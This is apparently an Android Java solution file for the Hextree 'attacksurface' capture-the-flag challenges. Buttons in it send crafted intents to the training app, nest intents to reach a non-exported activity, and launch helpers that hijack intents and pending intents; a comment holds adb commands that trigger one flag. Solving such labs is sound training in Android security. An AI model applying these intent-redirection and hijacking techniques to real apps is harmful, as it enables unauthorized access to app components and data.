package com.example.evilcorp;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import android.net.Uri;

public class Hextree_IntentsActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_send_intents);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


        // Back to Main Activity
        Button btn1 = findViewById(R.id.btnToMain);
        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Hextree_IntentsActivity.this, MainActivity.class);
                startActivity(intent);
            }
        });






//==========================================================================================================
//Start the challenges solutions
//===============================


//Activity 1 Flag Sending an Intent

        Button button1 = findViewById(R.id.button1);
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag1Activity";
                Intent intent = new Intent();
                intent.setClassName(appPackageName, appActivityName);
                startActivity(intent);
            }
        });


//Activity 2 Flag.... Sending an Intent with a custom FLAG

        Button button2 = findViewById(R.id.button2);
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag2Activity";
                String action = "io.hextree.action.GIVE_FLAG";


                // Notice.... instead of passing the action in the Intent constructor parameters, you can use intent.setAction(action);
                Intent intent = new Intent(action);
                intent.setClassName(appPackageName, appActivityName);
                startActivity(intent);
            }
        });


//Activity 3 Flag.... Sending an Intent with a custom FLAG AND data.

        Button button3 = findViewById(R.id.button3);
        button3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag3Activity";
                String action = "io.hextree.action.GIVE_FLAG";
                Uri weburi = Uri.parse("https://app.hextree.io/map/android");

                // Notice.... instead of passing the action and data in the Intent constructor parameters, you can use intent.setAction(action); and setData(weburi);
                Intent intent = new Intent(action, weburi);
                intent.setClassName(appPackageName, appActivityName);
                startActivity(intent);
            }
        });


//Activity 4 Flag.... Sending consecutive Intents with a custom Actions.

        // To be honest the FLAG4 solution is tricky, while the code I have written below should work HOWEVER because the 4 intents all almost run at the same time and not sequentially with delays, it is not working.

        /*
            use adb shell instead. ONE BY ONE

                adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
                adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION
                adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
                adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity

         */

        Button btn4 = findViewById(R.id.button4);
        btn4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String appPackageName = "io.hextree.attacksurface";
                String appActivityName = "io.hextree.attacksurface.activities.Flag4Activity";

                // 1. PREPARE_ACTION
                Intent intent1 = new Intent();
                intent1.setClassName(appPackageName, appActivityName);
                intent1.setAction("PREPARE_ACTION");
                intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent1);

                // 2. BUILD_ACTION
                Intent intent2 = new Intent();
                intent2.setClassName(appPackageName, appActivityName);
                intent2.setAction("BUILD_ACTION");
                intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent2);

                // 3. GET_FLAG_ACTION
                Intent intent3 = new Intent();
                intent3.setClassName(appPackageName, appActivityName);
                intent3.setAction("GET_FLAG_ACTION");
                intent3.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent3);

                // 4. Final start with no explicit action
                Intent intent4 = new Intent();
                intent4.setClassName(appPackageName, appActivityName);
                intent4.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent4);
            }
        });




//Activity 5 Flag.... Sending an NESTED intents.
        // I tried to simplify it as much as I could.

        Button button5 = findViewById(R.id.button5);
        button5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag5Activity";

                // INNER intent
                Intent innerIntent = new Intent();
                innerIntent.putExtra("reason", "back");

                // MIDDLE intent and nest the inner intent into it
                Intent middleIntent = new Intent();
                middleIntent.putExtra("return", 42);
                middleIntent.putExtra("nextIntent", innerIntent);

                // OUTER intent and pack the middle intent into it
                Intent outerIntent = new Intent();
                outerIntent.setClassName(appPackageName, appActivityName);
                outerIntent.putExtra("android.intent.extra.INTENT", middleIntent);

                // Running the outer intent which in return runs the intents within
                startActivity(outerIntent);

            }
        });



//Activity 6 Flag.... Calling a NON-exported activity via another activity in the same app.

        Button button6 = findViewById(R.id.button6);
        button6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag6Activity";

                // INNER intent
                Intent innerIntent = new Intent();
                innerIntent.putExtra("reason", "next");
                innerIntent.setClassName(appPackageName, appActivityName);
                innerIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);



                // MIDDLE intent and nest the inner intent into it
                Intent middleIntent = new Intent();
                middleIntent.putExtra("return", 42);
                middleIntent.putExtra("nextIntent", innerIntent);

                // OUTER intent and pack the middle intent into it
                Intent outerIntent = new Intent();
                outerIntent.setClassName(appPackageName, "io.hextree.attacksurface.activities.Flag5Activity");
                outerIntent.putExtra("android.intent.extra.INTENT", middleIntent);

                // Running the outer intent which in return runs the intents within
                startActivity(outerIntent);


            }
        });




//Activity 7 Flag.... Sending two Intents in the same activity INSTANCE with FLAG_ACTIVITY_SINGLE_TOP flag

        Button button7 = findViewById(R.id.button7);
        button7.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag7Activity";

                Intent intent  = new Intent();
                intent.setAction("OPEN");
                intent.setClassName(appPackageName,appActivityName);
                startActivity(intent); //this will get the first activity condition to be true.


                Intent intent2 = new Intent();
                intent2.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); //value  0x20000000
                intent2.setAction("REOPEN");
                intent2.setClassName(appPackageName,appActivityName);
                startActivity(intent2);

            }
        });



//Activity 8 Flag --- Sending an Intent with a condition => ActivityClassName should contain "Hextree" in the name.
        //that is why i renamed the current activity class name to contain the word (Hextree)_SendIntentsActivity

        Button button8 = findViewById(R.id.button8);
        button8.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag8Activity";

                Intent intent = new Intent();

                intent.setClassName(appPackageName, appActivityName);
                // request code 1 here is just an identifier... it must be > 0 .
                startActivityForResult(intent, 1);
            }
        });


//Activity 9 Flag --- Sending an Intent with the same "Hextree" condition as before, and catching the RESULT which is the FLAG.

        Button button9 = findViewById(R.id.button9);
        button9.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag9Activity";

                Intent intent = new Intent();

                intent.setClassName(appPackageName, appActivityName);
                // again... the number below is an identifier, don't care much about it.
                startActivityForResult(intent, 1);

                // the result will be caught by the below onActivityResult function.
            }
        });


//Activity 10 Flag --- Crafting an activity that HIJACKS the target app's intents.
        // Further code can be found in .extraActivities/Chall10CatcherActivity

        Button button10 = findViewById(R.id.button10);
        button10.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // this intent is just there to open the Challenge 10 activity.
                Intent intent = new Intent (Hextree_IntentsActivity.this , com.example.evilcorp.extraActivities.Chall10CatcherActivity.class);
                startActivity(intent);
            }
        });





// Challenge 10, 11, 12 are together in single activity.


//Activity 22 Flag --- Crafting an activity that Hijacks the target app's intents.

        Button button13 = findViewById(R.id.button13);
        button13.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent (Hextree_IntentsActivity.this , com.example.evilcorp.extraActivities.Chall22Activity.class);
                startActivity(intent);
            }
        });


//Activity 23 Flag --- Hijacking a pending intent sent by the target app.

        Button button14 = findViewById(R.id.button14);
        button14.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent (Hextree_IntentsActivity.this , com.example.evilcorp.extraActivities.Chall23Activity.class);
                startActivity(intent);

            }
        });





// end of OnCreate() function =====================================================================================================
    }




    // OnActivityResult to get the result of a sent intent.... Activity9Flag
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (data != null) {
            String return_result = data.getStringExtra("flag");
            System.out.println(return_result);
        }

            // extra library to show what data comes with the intent reply.
        Utils.showDialog(this, data);
    }
}


